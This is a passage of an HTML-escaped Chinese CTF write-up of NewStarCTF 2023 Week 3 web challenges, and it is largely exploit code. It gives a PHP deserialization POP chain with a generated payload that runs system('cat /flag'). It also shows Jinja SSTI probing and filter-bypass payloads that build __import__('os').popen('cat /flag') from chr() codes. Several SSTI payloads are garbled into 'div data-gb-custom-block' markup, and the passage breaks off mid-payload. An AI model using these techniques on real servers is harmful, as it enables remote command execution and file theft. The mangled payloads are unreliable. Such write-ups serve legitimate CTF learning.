&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c = getColumn()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = getFlag()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(a)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(b)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(c)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(d)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-3-pop-gadget&quot;&gt;[Week 3]POP Gadget&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-3-pop-gadget&quot; aria-label=&quot;Anchor link for: week-3-pop-gadget&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;源代码&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Begin{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $name;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __destruct()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(preg_match(&amp;quot;&#x2F;[a-zA-Z0-9]&#x2F;&amp;quot;,$this-&amp;gt;name)){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            echo &amp;quot;Hello&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            echo &amp;quot;Welcome to NewStarCTF 2023!&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Then{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    private $func;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __toString()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ($this-&amp;gt;func)();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return &amp;quot;Good Job!&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Handle{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    protected $obj;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __call($func, $vars)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;obj-&amp;gt;end();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Super{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    protected $obj;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __invoke()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;obj-&amp;gt;getStr();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function end()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(&amp;quot;==GAME OVER==&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class CTF{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $handle;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function end()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        unset($this-&amp;gt;handle-&amp;gt;log);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class WhiteGod{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $func;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $var;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __unset($var)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ($this-&amp;gt;func)($this-&amp;gt;var);    
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@unserialize($_POST[&amp;#39;pop&amp;#39;]);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;POP链如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Begin::__destruct()-&amp;gt;Then::__toString()-&amp;gt;Super::__invoke()-&amp;gt;Handle::__call($func, $vars)-&amp;gt;CTF::end()-&amp;gt;WhiteGod::__unset($var)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;构造 Payload 过程如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Begin{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $name;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __destruct()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(preg_match(&amp;quot;&#x2F;[a-zA-Z0-9]&#x2F;&amp;quot;,$this-&amp;gt;name)){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            echo &amp;quot;Hello&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            echo &amp;quot;Welcome to NewStarCTF 2023!&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Then{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    private $func;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __construct($super)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;func = $super;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __toString()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ($this-&amp;gt;func)();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return &amp;quot;Good Job!&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Handle{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    protected $obj;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __construct($ctf)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;obj = $ctf;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __call($func, $vars)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;obj-&amp;gt;end();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Super{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    protected $obj;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __construct($handle)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;obj = $handle;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __invoke()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;obj-&amp;gt;getStr();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function end()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die(&amp;quot;==GAME OVER==&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class CTF{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $handle;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function end()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        unset($this-&amp;gt;handle-&amp;gt;log);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class WhiteGod{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $func;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $var;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __unset($var)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ($this-&amp;gt;func)($this-&amp;gt;var);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@unserialize($_POST[&amp;#39;pop&amp;#39;]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$begin = new Begin();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ctf = new CTF();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$handle = new Handle($ctf);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$super = new Super($handle);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$begin-&amp;gt;name = new Then($super);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ctf-&amp;gt;handle = new WhiteGod();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ctf-&amp;gt;handle-&amp;gt;func = &amp;quot;system&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ctf-&amp;gt;handle-&amp;gt;var = &amp;quot;cat &#x2F;flag&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo urlencode(serialize($begin));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-3-genshin&quot;&gt;[Week 3]GenShin&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-3-genshin&quot; aria-label=&quot;Anchor link for: week-3-genshin&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过查看 Network - Headers 可以发现 Pop 属性值为 &lt;code&gt;&#x2F;secr3tofpop&lt;&#x2F;code&gt; ，通过访问可以得到回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;please give a name by get
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;name=123
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Welcome to NewstarCTF 2023 123
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;猜测应该是 Python 的 SSTI 注入，通过构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;name={{7*7}}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;big hacker!get away from me!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;尝试另外一种 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;name=&amp;lt;div data-gb-custom-block data-tag=&amp;quot;print&amp;quot; data-0=&amp;#39;7&amp;#39; data-1=&amp;#39;7&amp;#39; data-2=&amp;#39;7&amp;#39; data-3=&amp;#39;7&amp;#39;&amp;gt;&amp;lt;&#x2F;div&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Welcome to NewstarCTF 2023 49
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;故判断可以通过此方法继续进行 SSTI 注入，通过尝试各种关键字可以发现 &lt;code&gt;单引号, init, lipsum, url_for, 反斜杠, popen&lt;&#x2F;code&gt; 被过滤了。&lt;&#x2F;p&gt;
&lt;p&gt;通过构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;name=
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;div data-gb-custom-block data-tag=&amp;quot;print&amp;quot; data-0=&amp;#39;&amp;#39;&amp;gt;&amp;lt;&#x2F;div&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以输出所有的子类，被过滤的关键字可以通过 &lt;code&gt;|attr()&lt;&#x2F;code&gt; 进行绕过，由于直接使用 eval 无法使用 chr 函数，因此需要通过在里面多套一层 eval 来实现，由于已经存在单双引号了，所以就直接全用 chr 函数来实现注入吧，生成脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;string = &amp;quot;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat &#x2F;flag&amp;#39;).read()&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;output = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for char in string:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    output += f&amp;quot;chr({ord(char)})%2b&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(output)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;name=
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;div data-gb-custom-block data-tag=&amp;quot;print&amp;quot; data-0=&amp;#39;&amp;#39; data-1=&amp;#39;&amp;#39; data-2=&amp;#39;132&amp;#39; data-3=&amp;#39;132&amp;#39; data-4=&amp;#39;132&amp;#39; data-5=&amp;#39;132&amp;#39; data-6=&amp;#39;132&amp;#39; data-7=&amp;#39;132&amp;#39; data-8=&amp;#39;132&amp;#39; data-9=&amp;#39;132&amp;#39; data-10=&amp;#39;132&amp;#39; data-11=&amp;#39;132&amp;#39; data-12=&amp;#39;132&amp;#39; data-13=&amp;#39;132&amp;#39; data-14=&amp;#39;132&amp;#39; data-15=&amp;#39;2&amp;#39; data-16=&amp;#39;__in&amp;#39; data-17=&amp;#39;__in&amp;#39; data-18=&amp;#39;+&amp;#39; data-19=&amp;#39;)|attr(&amp;#39; data-20=&amp;#39;__globals__&amp;#39; data-21=&amp;#39;))[&amp;#39; data-22=&amp;#39;__builtins__&amp;#39; data-23=&amp;#39;].eval(&amp;#39; data-24=&amp;#39;95&amp;#39; data-25=&amp;#39;95&amp;#39; data-26=&amp;#39;95&amp;#39; data-27=&amp;#39;95&amp;#39; data-28=&amp;#39;95&amp;#39; data-29=&amp;#39;5&amp;#39; data-30=&amp;#39;2&amp;#39; data-31=&amp;#39;2&amp;#39; data-32=&amp;#39;2&amp;#39; data-33=&amp;#39;95&amp;#39; data-34=&amp;#39;95&amp;#39; data-35=&amp;#39;95&amp;#39; data-36=&amp;#39;5&amp;#39; data-37=&amp;#39;2&amp;#39; data-38=&amp;#39;2&amp;#39; data-39=&amp;#39;2&amp;#39; data-40=&amp;#39;105&amp;#39; data-41=&amp;#39;105&amp;#39; data-42=&amp;#39;5&amp;#39; data-43=&amp;#39;2&amp;#39; data-44=&amp;#39;2&amp;#39; data-45=&amp;#39;2&amp;#39; data-46=&amp;#39;109&amp;#39; data-47=&amp;#39;109&amp;#39; data-48=&amp;#39;9&amp;#39; data-49=&amp;#39;2&amp;#39; data-50=&amp;#39;2&amp;#39; data-51=&amp;#39;2&amp;#39; data-52=&amp;#39;112&amp;#39; data-53=&amp;#39;112&amp;#39; data-54=&amp;#39;12&amp;#39; data-55=&amp;#39;2&amp;#39; data-56=&amp;#39;2&amp;#39; data-57=&amp;#39;2&amp;#39; data-58=&amp;#39;111&amp;#39; data-59=&amp;#39;111&amp;#39; data-60=&amp;#39;11&amp;#39; data-61=&amp;#39;2&amp;#39; data-62=&amp;#39;2&amp;#39; data-63=&amp;#39;2&amp;#39; data-64=&amp;#39;114&amp;#39; data-65=&amp;#39;114&amp;#39; data-66=&amp;#39;14&amp;#39; data-67=&amp;#39;2&amp;#39; data-68=&amp;#39;2&amp;#39; data-69=&amp;#39;2&amp;#39; data-70=&amp;#39;116&amp;#39; data-71=&amp;#39;116&amp;#39; data-72=&amp;#39;16&amp;#39; data-73=&amp;#39;2&amp;#39; data-74=&amp;#39;2&amp;#39; data-75=&amp;#39;2&amp;#39; data-76=&amp;#39;95&amp;#39; data-77=&amp;#39;95&amp;#39; data-78=&amp;#39;95&amp;#39; data-79=&amp;#39;5&amp;#39; data-80=&amp;#39;2&amp;#39; data-81=&amp;#39;2&amp;#39; data-82=&amp;#39;2&amp;#39; data-83=&amp;#39;95&amp;#39; data-84=&amp;#39;95&amp;#39; data-85=&amp;#39;95&amp;#39; data-86=&amp;#39;5&amp;#39; data-87=&amp;#39;2&amp;#39; data-88=&amp;#39;2&amp;#39; data-89=&amp;#39;2&amp;#39; data-90=&amp;#39;40&amp;#39; data-91=&amp;#39;40&amp;#39; data-92=&amp;#39;40&amp;#39; data-93=&amp;#39;0&amp;#39; data-94=&amp;#39;2&amp;#39; data-95=&amp;#39;2&amp;#39; data-96=&amp;#39;2&amp;#39; data-97=&amp;#39;39&amp;#39; data-98=&amp;#39;39&amp;#39; data-99=&amp;#39;39&amp;#39; data-100=&amp;#39;9&amp;#39; data-101=&amp;#39;2&amp;#39; data-102=&amp;#39;2&amp;#39; data-103=&amp;#39;2&amp;#39; data-104=&amp;#39;111&amp;#39; data-105=&amp;#39;111&amp;#39; 